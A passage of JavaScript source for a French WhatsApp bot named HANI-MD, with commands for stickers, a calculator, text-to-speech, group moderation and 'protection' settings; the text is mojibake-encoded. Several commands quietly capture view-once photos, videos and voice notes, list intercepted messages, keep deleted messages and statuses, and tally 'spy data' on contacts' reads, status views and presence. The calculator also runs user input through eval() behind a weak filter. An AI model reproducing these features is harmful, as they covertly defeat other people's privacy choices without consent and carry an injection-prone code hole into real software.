
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // ðŸŽ¨ OUTILS - Sticker, Calculatrice, etc.
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    case "sticker":
    case "s": {
      // VÃ©rifier si c'est une rÃ©ponse Ã  un mÃ©dia
      const quotedMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
      const hasImage = quotedMsg?.imageMessage || msg.message?.imageMessage;
      const hasVideo = quotedMsg?.videoMessage || msg.message?.videoMessage;
      
      if (!hasImage && !hasVideo) {
        return send(`ðŸŽ¨ *CRÃ‰ER UN STICKER*\n\nðŸ“‹ *Usage:*\nRÃ©ponds Ã  une image ou vidÃ©o avec \`.sticker\`\n\nOu envoie une image avec la lÃ©gende \`.sticker\`\n\nðŸ’¡ Les vidÃ©os courtes deviennent des stickers animÃ©s!`);
      }
      
      await send("ðŸŽ¨ *CrÃ©ation du sticker en cours...*");
      
      try {
        let mediaBuffer;
        let isVideo = false;
        
        // TÃ©lÃ©charger le mÃ©dia
        if (quotedMsg?.imageMessage || quotedMsg?.videoMessage) {
          const downloadMsg = {
            ...msg,
            message: quotedMsg
          };
          mediaBuffer = await downloadMediaMessage(downloadMsg, "buffer", {});
          isVideo = !!quotedMsg?.videoMessage;
        } else if (msg.message?.imageMessage || msg.message?.videoMessage) {
          mediaBuffer = await downloadMediaMessage(msg, "buffer", {});
          isVideo = !!msg.message?.videoMessage;
        }
        
        if (!mediaBuffer) {
          return send(`âŒ Impossible de tÃ©lÃ©charger le mÃ©dia`);
        }
        
        // CrÃ©er le sticker
        await hani.sendMessage(from, {
          sticker: mediaBuffer,
          packname: "HANI-MD",
          author: config.NOM_OWNER || "H2025"
        }, { quoted: msg });
        
        return;
        
      } catch (e) {
        console.log("[STICKER] Erreur:", e.message);
        return send(`âŒ Erreur lors de la crÃ©ation du sticker: ${e.message}`);
      }
    }

    case "toimg":
    case "toimage": {
      const quotedSticker = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage?.stickerMessage;
      
      if (!quotedSticker) {
        return send(`ðŸ–¼ï¸ *STICKER â†’ IMAGE*\n\nðŸ“‹ *Usage:*\nRÃ©ponds Ã  un sticker avec \`.toimg\`\n\nðŸ’¡ Convertit le sticker en image!`);
      }
      
      try {
        const downloadMsg = {
          ...msg,
          message: { stickerMessage: quotedSticker }
        };
        const stickerBuffer = await downloadMediaMessage(downloadMsg, "buffer", {});
        
        await hani.sendMessage(from, {
          image: stickerBuffer,
          caption: `ðŸ–¼ï¸ Voici ton sticker converti en image!\n\nâœ… *Powered by HANI-MD*`
        }, { quoted: msg });
        
        return;
        
      } catch (e) {
        return send(`âŒ Erreur: ${e.message}`);
      }
    }

    case "calc":
    case "calculate":
    case "calculer": {
      if (!args) {
        return send(`ðŸ”¢ *CALCULATRICE*\n\nðŸ“‹ *Usage:*\n\`.calc [expression]\`\n\nðŸ“ *Exemples:*\n\`.calc 2+2\`\n\`.calc 100*5/2\`\n\`.calc (10+5)*3\`\n\`.calc sqrt(16)\`\n\`.calc 2^8\``);
      }
      
      try {
        // Nettoyer et sÃ©curiser l'expression
        let expression = args
          .replace(/x/gi, "*")
          .replace(/Ã·/g, "/")
          .replace(/\^/g, "**")
          .replace(/sqrt\(([^)]+)\)/gi, "Math.sqrt($1)")
          .replace(/sin\(([^)]+)\)/gi, "Math.sin($1)")
          .replace(/cos\(([^)]+)\)/gi, "Math.cos($1)")
          .replace(/tan\(([^)]+)\)/gi, "Math.tan($1)")
          .replace(/log\(([^)]+)\)/gi, "Math.log10($1)")
          .replace(/ln\(([^)]+)\)/gi, "Math.log($1)")
          .replace(/pi/gi, "Math.PI")
          .replace(/e(?![a-z])/gi, "Math.E");
        
        // VÃ©rifier que l'expression est sÃ»re
        if (!/^[0-9+\-*/.()Math\s,sqrtsincoantlog]+$/i.test(expression.replace(/\./g, ''))) {
          return send(`âŒ Expression invalide!`);
        }
        
        const result = eval(expression);
        
        return send(`ðŸ”¢ *CALCULATRICE*\n\nðŸ“ Expression: \`${args}\`\nâœ… RÃ©sultat: *${result}*`);
        
      } catch (e) {
        return send(`âŒ Expression invalide: ${e.message}`);
      }
    }

    case "tts":
    case "say":
    case "parle": {
      if (!args) {
        return send(`ðŸ”Š *TEXT TO SPEECH*\n\nðŸ“‹ *Usage:*\n\`.tts [texte]\`\n\nðŸ“ *Exemple:*\n\`.tts Bonjour, je suis HANI\`\n\nðŸ—£ï¸ Convertit le texte en audio!`);
      }
      
      await send("ðŸ”Š *GÃ©nÃ©ration de l'audio...*");
      
      try {
        // Utiliser l'API Google TTS
        const ttsUrl = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(args)}&tl=fr&client=tw-ob`;
        
        const audioResp = await fetch(ttsUrl, {
          headers: {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
          }
        });
        const audioBuffer = await audioResp.buffer();
        
        await hani.sendMessage(from, {
          audio: audioBuffer,
          mimetype: "audio/mp3",
          ptt: true // Envoyer comme message vocal
        }, { quoted: msg });
        
        return;
        
      } catch (e) {
        return send(`âŒ Erreur TTS: ${e.message}`);
      }
    }

    case "whoami": {
      const senderNum = extractNumber(sender);
      const botNum = botNumberClean;
      
      // Afficher tous les numÃ©ros owner
      const allOwnerNumbers = config.NUMERO_OWNER.split(',').map(n => n.trim());
      const cleanOwnerNumbers = allOwnerNumbers.map(n => n.replace(/[^0-9]/g, ''));
      
      // VÃ©rification dÃ©taillÃ©e
      const matchDetails = cleanOwnerNumbers.map(owner => {
        const exactMatch = senderNumber === owner;
        const endsWithMatch = senderNumber.endsWith(owner) || owner.endsWith(senderNumber);
        return `â€¢ ${owner} ${exactMatch ? "âœ… EXACT" : endsWithMatch ? "âœ… PARTIEL" : "âŒ NON"}`;
      }).join('\nâ”ƒ ');
      
      const info = `
â•­â”â”â” ðŸ” *QUI SUIS-JE ?* â”â”â”â•®
â”ƒ
â”ƒ ðŸ“± *Sender JID:*
â”ƒ ${sender}
â”ƒ
â”ƒ ðŸ“ž *Ton numÃ©ro (extrait):*
â”ƒ ${senderNumber}
â”ƒ
â”ƒ ðŸ¤– *NumÃ©ro du bot:*
â”ƒ ${botNum}
â”ƒ
â”ƒ ðŸ‘‘ *Owners dans .env:*
â”ƒ ${allOwnerNumbers.join(', ')}
â”ƒ
â”ƒ ðŸ” *Correspondance:*
â”ƒ ${matchDetails}
â”ƒ
â”ƒ ðŸ”‘ *fromMe:*
â”ƒ ${msg.key.fromMe ? "OUI" : "NON"}
â”ƒ
â”ƒ â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
â”ƒ âœ… *Es-tu owner ?*
â”ƒ ${isOwner ? "OUI âœ“" : "NON âœ—"}
â”ƒ
â”ƒ ðŸ›¡ï¸ *Es-tu sudo ?*
â”ƒ ${isSudo ? "OUI âœ“" : "NON âœ—"}
â”ƒ
â”ƒ âœ… *Es-tu approuvÃ© ?*
â”ƒ ${isApproved ? "OUI âœ“" : "NON âœ—"}
â”ƒ
â”ƒ ðŸ·ï¸ *Ton rÃ´le:*
â”ƒ ${userRole.toUpperCase()}
â”ƒ
â•°â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•¯

${!isOwner ? `âš ï¸ *Pour te dÃ©finir comme owner:*
Modifie .env et ajoute ton numÃ©ro:
NUMERO_OWNER=...,...,${senderNumber}` : "âœ… Tu es bien reconnu comme OWNER!"}
      `.trim();
      
      return reply(info);
    }

    case "setowner": {
      // Seul le bot lui-mÃªme ou fromMe peut exÃ©cuter
      if (!msg.key.fromMe && senderNumber !== botNumberClean) {
        return reply("âŒ Seul le propriÃ©taire du tÃ©lÃ©phone peut faire Ã§a.");
      }
      
      const newOwner = args.replace(/[^0-9]/g, "");
      if (!newOwner || newOwner.length < 10) {
        return reply(`âŒ NumÃ©ro invalide.\n\nUtilisation: .setowner 22550252467`);
      }
      
      // Mettre Ã  jour la config en mÃ©moire
      config.NUMERO_OWNER = newOwner;
      
      return reply(`âœ… Owner temporairement dÃ©fini: ${newOwner}\n\nâš ï¸ Pour rendre permanent, modifie .env:\nNUMERO_OWNER=${newOwner}`);
    }

    case "menu":
    case "help":
    case "aide": {
      // Utiliser le nouveau systÃ¨me de menu stylisÃ©
      try {
        const menuSystem = require('./lib/MenuSystem');
        const ownerNumber = (config.NUMERO_OWNER || '').replace(/[^0-9]/g, '');
        const senderClean = senderNumber.replace(/[^0-9]/g, '');
        
        const userInfo = {
          name: pushName || 'Utilisateur',
          phone: senderClean,
          plan: isOwner ? 'OWNER' : (isSudo ? 'PREMIUM' : 'FREE'),
          isOwner: isOwner,
          isPremium: isOwner || isSudo,
          commandsToday: 0,
          dailyLimit: isOwner ? -1 : 30,
          theme: 'elegant'
        };
        
        // Si une catÃ©gorie est spÃ©cifiÃ©e
        if (args) {
          const categoryMenu = menuSystem.generateCategoryMenu(args.toLowerCase(), userInfo);
          return send(categoryMenu);
        }
        
        // Menu principal
        const mainMenu = menuSystem.generateMainMenu(userInfo);
        await send(mainMenu);
        return;
      } catch (e) {
        console.error("[MENU ERROR]", e);
        // Fallback vers l'ancien menu si erreur
        const menuText = getMainMenu(config.PREFIXE, userRole);
        await send(menuText);
        return;
      }
    }

    case "info": {
      const uptime = formatUptime(Date.now() - db.data.stats.startTime);
      const infoText = `
â•­â”â”â” ðŸ¤– *HANI-MD INFO* â”â”â”â•®
â”ƒ
â”ƒ ðŸ“› Nom: ${config.BOT_NAME}
â”ƒ ðŸ“± Version: ${config.VERSION}
â”ƒ ðŸ‘‘ Owner: ${config.NOM_OWNER}
â”ƒ ðŸ”§ PrÃ©fixe: ${config.PREFIXE}
â”ƒ ðŸŒ Mode: ${config.MODE}
â”ƒ
â”ƒ ðŸ“Š *Statistiques*
â”ƒ â±ï¸ Uptime: ${uptime}
â”ƒ ðŸ“¨ Commandes: ${db.data.stats.commands}
â”ƒ ðŸ‘¥ Utilisateurs: ${Object.keys(db.data.users).length}
â”ƒ ðŸ˜ï¸ Groupes: ${Object.keys(db.data.groups).length}
â”ƒ
â”ƒ ðŸ›¡ï¸ *Protections AUTOMATIQUES*
â”ƒ â€¢ Anti-delete: ${protectionState.antidelete ? "âœ…" : "âŒ"}
â”ƒ â€¢ Anti-appel: ${protectionState.anticall ? "âœ…" : "âŒ"}
â”ƒ â€¢ Vue unique: ${protectionState.autoViewOnce ? "âœ…" : "âŒ"}
â”ƒ â€¢ Vocal unique: ${protectionState.autoViewOnceAudio ? "âœ…" : "âŒ"}
â”ƒ â€¢ Save statuts: ${protectionState.autoSaveStatus ? "âœ…" : "âŒ"}
â”ƒ â€¢ Anti-delete statut: ${protectionState.antideletestatus ? "âœ…" : "âŒ"}
â”ƒ
â•°â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•¯

ðŸ“¨ _Tout est envoyÃ© dans "Moi-mÃªme"_
`;
      return send(infoText);
    }

    case "stats": {
      const uptime = formatUptime(Date.now() - db.data.stats.startTime);
      return send(`ðŸ“Š *Statistiques HANI-MD*

â±ï¸ En ligne depuis: ${uptime}
ðŸ“¨ Commandes exÃ©cutÃ©es: ${db.data.stats.commands}
ðŸ’¬ Messages traitÃ©s: ${db.data.stats.messages || 0}
ðŸ‘¥ Utilisateurs: ${Object.keys(db.data.users).length}
ðŸ˜ï¸ Groupes: ${Object.keys(db.data.groups).length}
ðŸš« Bannis: ${db.data.banned.length}
ðŸ‘‘ Sudos: ${db.data.sudo.length}`);
    }

    case "diagnostic":
    case "diag":
    case "health":
    case "sante": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      const uptime = formatUptime(Date.now() - db.data.stats.startTime);
      const memUsage = process.memoryUsage();
      const memMB = Math.round(memUsage.heapUsed / 1024 / 1024);
      const memTotalMB = Math.round(memUsage.heapTotal / 1024 / 1024);
      
      // Ã‰tat des protections
      const protections = Object.entries(protectionState)
        .map(([k, v]) => `${v ? 'âœ…' : 'âŒ'} ${k}`)
        .join('\n');
      
      // Ã‰tat des donnÃ©es espion
      const spyStats = {
        statusViews: spyData.statusViews?.length || 0,
        messageReads: spyData.messageReads?.length || 0,
        replies: spyData.replies?.length || 0,
        presences: spyData.presenceDetected?.length || 0,
        contacts: contactsDB.size || 0
      };
      
      // Ã‰tat MySQL
      const mysqlStatus = db.mysqlConnected ? 'âœ… ConnectÃ©' : 'âŒ Non connectÃ© (mode local)';
      
      const diagText = `ðŸ”§ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
   *DIAGNOSTIC SYSTÃˆME HANI-MD*
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ðŸ“Š *SYSTÃˆME:*
â€¢ â±ï¸ Uptime: ${uptime}
â€¢ ðŸ’¾ RAM: ${memMB}MB / ${memTotalMB}MB
â€¢ ðŸ“¦ Node.js: ${process.version}
â€¢ ðŸ–¥ï¸ Plateforme: ${process.platform}

ðŸ—„ï¸ *BASE DE DONNÃ‰ES:*
â€¢ MySQL: ${mysqlStatus}
â€¢ ðŸ‘¥ Utilisateurs: ${Object.keys(db.data.users).length}
â€¢ ðŸ˜ï¸ Groupes: ${Object.keys(db.data.groups).length}
â€¢ ðŸ“‡ Contacts enregistrÃ©s: ${spyStats.contacts}

ðŸ•µï¸ *DONNÃ‰ES ESPION:*
â€¢ ðŸ‘ï¸ Vues statuts: ${spyStats.statusViews}
â€¢ ðŸ“– Messages lus: ${spyStats.messageReads}
â€¢ â†©ï¸ RÃ©ponses: ${spyStats.replies}
â€¢ âœï¸ PrÃ©sences: ${spyStats.presences}

ðŸ’¾ *STOCKAGE MESSAGES:*
â€¢ ðŸ“¨ Messages stockÃ©s: ${messageStore.size}
â€¢ ðŸ—‘ï¸ Messages supprimÃ©s: ${deletedMessages.length}
â€¢ ðŸ‘ï¸ ViewOnce interceptÃ©s: ${viewOnceMessages.size}
â€¢ ðŸ“¸ Statuts sauvegardÃ©s: ${statusStore.size}

ðŸ›¡ï¸ *PROTECTIONS:*
${protections}

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ðŸ’¡ *Commandes utiles:*
â€¢ _.spyclear_ - Vider donnÃ©es espion
â€¢ _.protection_ - GÃ©rer protections
â€¢ _.restart_ - RedÃ©marrer le bot`;
      
      return send(diagText);
    }

    case "runtime":
    case "uptime": {
      const uptime = formatUptime(Date.now() - db.data.stats.startTime);
      return send(`â±ï¸ *Temps en ligne*\n\nðŸ¤– HANI-MD fonctionne depuis: *${uptime}*`);
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ GROUPE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    case "kick":
    case "remove": {
      if (!isGroupMsg) return send("âŒ Cette commande est rÃ©servÃ©e aux groupes.");
      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin pour utiliser cette commande.");
      if (!isBotAdmin) return send("âŒ Je dois Ãªtre admin pour exclure quelqu'un.");
      
      let target = mentioned[0] || quotedParticipant;
      if (!target) return send("âŒ Mentionne quelqu'un ou rÃ©ponds Ã  son message.");
      
      try {
        await hani.groupParticipantsUpdate(from, [target], "remove");
        return reply(`âœ… ${target.split("@")[0]} a Ã©tÃ© exclu du groupe.`);
      } catch (e) {
        return send("âŒ Impossible d'exclure ce membre.");
      }
    }

    case "add": {
      if (!isGroupMsg) return send("âŒ Cette commande est rÃ©servÃ©e aux groupes.");
      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin.");
      if (!isBotAdmin) return send("âŒ Je dois Ãªtre admin.");
      
      if (!args) return send("âŒ Donne un numÃ©ro. Ex: .add 22550000000");
      
      const number = formatNumber(args);
      try {
        await hani.groupParticipantsUpdate(from, [number], "add");
        return reply(`âœ… ${args} a Ã©tÃ© ajoutÃ© au groupe.`);
      } catch (e) {
        return send("âŒ Impossible d'ajouter ce numÃ©ro. VÃ©rifie le numÃ©ro ou les paramÃ¨tres de confidentialitÃ©.");
      }
    }

    case "promote": {
      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin.");
      if (!isBotAdmin) return send("âŒ Je dois Ãªtre admin.");
      
      let target = mentioned[0] || quotedParticipant;
      if (!target) return send("âŒ Mentionne quelqu'un.");
      
      try {
        await hani.groupParticipantsUpdate(from, [target], "promote");
        return reply(`âœ… ${target.split("@")[0]} est maintenant admin!`);
      } catch (e) {
        return send("âŒ Erreur lors de la promotion.");
      }
    }

    case "demote": {
      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin.");
      if (!isBotAdmin) return send("âŒ Je dois Ãªtre admin.");
      
      let target = mentioned[0] || quotedParticipant;
      if (!target) return send("âŒ Mentionne quelqu'un.");
      
      try {
        await hani.groupParticipantsUpdate(from, [target], "demote");
        return reply(`âœ… ${target.split("@")[0]} n'est plus admin.`);
      } catch (e) {
        return send("âŒ Erreur lors de la rÃ©trogradation.");
      }
    }

    case "link":
    case "grouplink": {
      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
      if (!isBotAdmin) return send("âŒ Je dois Ãªtre admin pour obtenir le lien.");
      
      try {
        const code = await hani.groupInviteCode(from);
        return send(`ðŸ”— *Lien du groupe*\n\nhttps://chat.whatsapp.com/${code}`);
      } catch (e) {
        return send("âŒ Impossible d'obtenir le lien.");
      }
    }

    case "desc":
    case "description":
    case "setdesc": {
      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin.");
      if (!isBotAdmin) return send("âŒ Je dois Ãªtre admin.");
      if (!args) return send("âŒ Donne une description. Ex: .desc Bienvenue!");
      
      try {
        await hani.groupUpdateDescription(from, args);
        return reply("âœ… Description mise Ã  jour!");
      } catch (e) {
        return send("âŒ Erreur lors de la mise Ã  jour.");
      }
    }

    case "tagall":
    case "all": {
      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin.");
      
      const participants = groupMetadata.participants.map(p => p.id);
      let text = args ? `ðŸ“¢ *${args}*\n\n` : "ðŸ“¢ *Annonce*\n\n";
      participants.forEach(p => {
        text += `@${p.split("@")[0]}\n`;
      });
      
      return hani.sendMessage(from, { text, mentions: participants });
    }

    case "hidetag": {
      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin.");
      
      const participants = groupMetadata.participants.map(p => p.id);
      const text = args || "ðŸ“¢ Message important";
      
      return hani.sendMessage(from, { text, mentions: participants });
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ PROTECTIONS GROUPE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    case "antilink": {
      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin.");
      
      const param = args.toLowerCase();
      if (param === "on") groupData.antilink = true;
      else if (param === "off") groupData.antilink = false;
      else groupData.antilink = !groupData.antilink;
      db.save();
      
      return reply(`ðŸ”— Antilink ${groupData.antilink ? "âœ… activÃ©" : "âŒ dÃ©sactivÃ©"}`);
    }

    case "antispam": {
      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin.");
      
      const param = args.toLowerCase();
      if (param === "on") groupData.antispam = true;
      else if (param === "off") groupData.antispam = false;
      else groupData.antispam = !groupData.antispam;
      db.save();
      
      return reply(`ðŸš« Antispam ${groupData.antispam ? "âœ… activÃ©" : "âŒ dÃ©sactivÃ©"}`);
    }

    case "antibot": {
      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin.");
      
      const param = args.toLowerCase();
      if (param === "on") groupData.antibot = true;
      else if (param === "off") groupData.antibot = false;
      else groupData.antibot = !groupData.antibot;
      db.save();
      
      return reply(`ðŸ¤– Antibot ${groupData.antibot ? "âœ… activÃ©" : "âŒ dÃ©sactivÃ©"}`);
    }

    case "antitag": {
      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin.");
      
      const param = args.toLowerCase();
      if (param === "on") groupData.antitag = true;
      else if (param === "off") groupData.antitag = false;
      else groupData.antitag = !groupData.antitag;
      db.save();
      
      return reply(`ðŸ·ï¸ Antitag ${groupData.antitag ? "âœ… activÃ©" : "âŒ dÃ©sactivÃ©"}`);
    }

    case "mute":
    case "mutegroup": {
      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin.");
      if (!isBotAdmin) return send("âŒ Je dois Ãªtre admin.");
      
      const param = args.toLowerCase();
      const mute = param === "on" || param === "";
      
      try {
        await hani.groupSettingUpdate(from, mute ? "announcement" : "not_announcement");
        return reply(mute ? "ðŸ”‡ Groupe mutÃ©. Seuls les admins peuvent parler." : "ðŸ”Š Groupe dÃ©mutÃ©.");
      } catch (e) {
        return send("âŒ Erreur lors du mute.");
      }
    }

    case "warn": {
      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin.");
      
      let target = mentioned[0] || quotedParticipant;
      if (!target) return send("âŒ Mentionne quelqu'un.");
      
      const warns = db.addWarn(from, target);
      
      if (warns >= 3) {
        if (isBotAdmin) {
          await hani.groupParticipantsUpdate(from, [target], "remove");
          db.resetWarns(from, target);
          return reply(`âš ï¸ @${target.split("@")[0]} a atteint 3 warns et a Ã©tÃ© exclu!`, { mentions: [target] });
        }
        return reply(`âš ï¸ @${target.split("@")[0]} a 3 warns mais je ne suis pas admin pour l'exclure.`, { mentions: [target] });
      }
      
      return hani.sendMessage(from, { 
        text: `âš ï¸ @${target.split("@")[0]} a reÃ§u un avertissement!\nðŸ“Š Warns: ${warns}/3`,
        mentions: [target]
      });
    }

    case "unwarn":
    case "resetwarn": {
      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
      if (!isAdmin && !isSudo) return send("âŒ Tu dois Ãªtre admin.");
      
      let target = mentioned[0] || quotedParticipant;
      if (!target) return send("âŒ Mentionne quelqu'un.");
      
      db.resetWarns(from, target);
      return reply(`âœ… Warns rÃ©initialisÃ©s pour @${target.split("@")[0]}`, { mentions: [target] });
    }

    case "warnlist":
    case "warns": {
      if (!isGroupMsg) return send("âŒ RÃ©servÃ© aux groupes.");
      
      const group = db.getGroup(from);
      const warnedUsers = Object.entries(group.warns).filter(([_, w]) => w > 0);
      
      if (warnedUsers.length === 0) return reply("âœ… Aucun membre n'a de warns.");
      
      let text = "âš ï¸ *Liste des warns*\n\n";
      warnedUsers.forEach(([jid, count]) => {
        text += `â€¢ @${jid.split("@")[0]}: ${count}/3 warns\n`;
      });
      
      return hani.sendMessage(from, { 
        text, 
        mentions: warnedUsers.map(([jid]) => jid) 
      });
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ VUE UNIQUE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    case "vv":
    case "viewonce":
    case "vo": {
      // Supprimer la commande envoyÃ©e pour qu'elle soit invisible
      try {
        await hani.sendMessage(from, { delete: msg.key });
      } catch (e) {}
      
      // RÃ©cupÃ©rer le contexte du message citÃ©
      const contextInfo = msg.message?.extendedTextMessage?.contextInfo || 
                          msg.message?.imageMessage?.contextInfo ||
                          msg.message?.videoMessage?.contextInfo;
      
      if (!contextInfo?.quotedMessage) {
        return sendPrivate("âŒ RÃ©ponds Ã  un message Ã  vue unique pour le rÃ©cupÃ©rer.");
      }
      
      const quotedMessage = contextInfo.quotedMessage;
      const stanzaId = contextInfo.stanzaId;
      
      // Chercher le contenu Ã  vue unique dans diffÃ©rents endroits possibles
      let viewOnceContent = quotedMessage.viewOnceMessage || 
                            quotedMessage.viewOnceMessageV2 || 
                            quotedMessage.viewOnceMessageV2Extension;
      
      // Si pas trouvÃ© directement, chercher dans le message stockÃ©
      if (!viewOnceContent && stanzaId) {
        const stored = viewOnceMessages.get(stanzaId);
        if (stored && stored.message) {
          const storedMsg = stored.message.message;
          viewOnceContent = storedMsg?.viewOnceMessage || 
                           storedMsg?.viewOnceMessageV2 || 
                           storedMsg?.viewOnceMessageV2Extension;
        }
      }
      
      // VÃ©rifier aussi si le message citÃ© lui-mÃªme est un mÃ©dia (parfois le viewOnce est dÃ©jÃ  dÃ©roulÃ©)
      if (!viewOnceContent) {
        // Peut-Ãªtre que le message citÃ© EST le contenu viewOnce (image/video avec viewOnce: true)
        const mediaType = Object.keys(quotedMessage)[0];
        if (["imageMessage", "videoMessage", "audioMessage"].includes(mediaType)) {
          const mediaContent = quotedMessage[mediaType];
          if (mediaContent?.viewOnce === true) {
            viewOnceContent = { message: quotedMessage };
          }
        }
      }
      
      if (!viewOnceContent) {
        // Afficher les infos de debug
        const keys = Object.keys(quotedMessage);
        return sendPrivate(`âŒ Ce n'est pas un message Ã  vue unique.\n\nðŸ“‹ Type dÃ©tectÃ©: ${keys.join(", ")}`);
      }
      
      try {
        const mediaMsg = viewOnceContent.message || viewOnceContent;
        const mediaType = Object.keys(mediaMsg).find(k => k.includes("Message")) || Object.keys(mediaMsg)[0];
        const media = mediaMsg[mediaType];
        
        if (!media) {
          return sendPrivate("âŒ Impossible de lire le contenu du mÃ©dia.");
        }
        
        // TÃ©lÃ©charger le mÃ©dia
        const stream = await downloadMediaMessage(
          { message: mediaMsg, key: { remoteJid: from, id: stanzaId } },
          "buffer",
          {},
          { logger: pino({ level: "silent" }), reuploadRequest: hani.updateMediaMessage }
        );
        
        // Envoyer en privÃ© (Ã  soi-mÃªme)
        if (mediaType === "imageMessage" || mediaType.includes("image")) {
          await hani.sendMessage(botNumber, { 
            image: stream, 
            caption: "ðŸ‘ï¸ *Vue unique rÃ©cupÃ©rÃ©e!*\n\n" + (media.caption || "") 
          });
        } else if (mediaType === "videoMessage" || mediaType.includes("video")) {
          await hani.sendMessage(botNumber, { 
            video: stream, 
            caption: "ðŸ‘ï¸ *Vue unique rÃ©cupÃ©rÃ©e!*\n\n" + (media.caption || "") 
          });
        } else if (mediaType === "audioMessage" || mediaType.includes("audio")) {
          await hani.sendMessage(botNumber, { 
            audio: stream,
            mimetype: "audio/mp4"
          });
        } else {
          return sendPrivate("âŒ Type de mÃ©dia non supportÃ©: " + mediaType);
        }
        
        console.log(`[VIEW] Vue unique rÃ©cupÃ©rÃ©e par ${pushName}`);
      } catch (e) {
        console.log("Erreur VV:", e);
        return sendPrivate("âŒ Erreur: " + e.message);
      }
      return;
    }

    case "listvv":
    case "listviewonce": {
      if (viewOnceMessages.size === 0) return send("ðŸ“­ Aucun message Ã  vue unique interceptÃ©.");
      
      let list = "ðŸ‘ï¸ *Messages Ã  vue unique interceptÃ©s*\n\n";
      let i = 1;
      for (const [id, data] of viewOnceMessages) {
        list += `${i}. De: ${data.sender}\n   Type: ${data.type}\n   Date: ${data.date}\n\n`;
        i++;
      }
      return send(list);
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ GESTION DES PROTECTIONS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    case "protections":
    case "protect":
    case "auto": {
      let status = `
ðŸ›¡ï¸ *PROTECTIONS AUTOMATIQUES*
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

ðŸ“¨ Tout est envoyÃ© dans "Moi-mÃªme"

âœ… = ActivÃ© | âŒ = DÃ©sactivÃ©

ðŸ—‘ï¸ *Anti-delete*: ${protectionState.antidelete ? "âœ…" : "âŒ"}
    â”” Messages supprimÃ©s interceptÃ©s

ðŸ‘ï¸ *Vue unique*: ${protectionState.autoViewOnce ? "âœ…" : "âŒ"}
    â”” Photos/vidÃ©os vue unique

ðŸŽ¤ *Ã‰coute unique*: ${protectionState.autoViewOnceAudio ? "âœ…" : "âŒ"}
    â”” Vocaux Ã©coute unique

ðŸ“¸ *Save statuts*: ${protectionState.autoSaveStatus ? "âœ…" : "âŒ"}
    â”” Tous les statuts sauvegardÃ©s

ðŸ“¸ *Anti-delete statut*: ${protectionState.antideletestatus ? "âœ…" : "âŒ"}
    â”” Statuts supprimÃ©s interceptÃ©s

ðŸ“µ *Anti-appel*: ${protectionState.anticall ? "âœ…" : "âŒ"}
    â”” Appels automatiquement rejetÃ©s

ðŸ¤– *Anti-bot*: ${protectionState.antibot ? "âœ…" : "âŒ"}
    â”” Autres bots WhatsApp bloquÃ©s
    â”” Bots bloquÃ©s: ${blockedBots.size}

â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ðŸ’¡ *Pour modifier:*
â€¢ ${config.PREFIXE}antidelete [on/off]
â€¢ ${config.PREFIXE}viewonce [on/off]
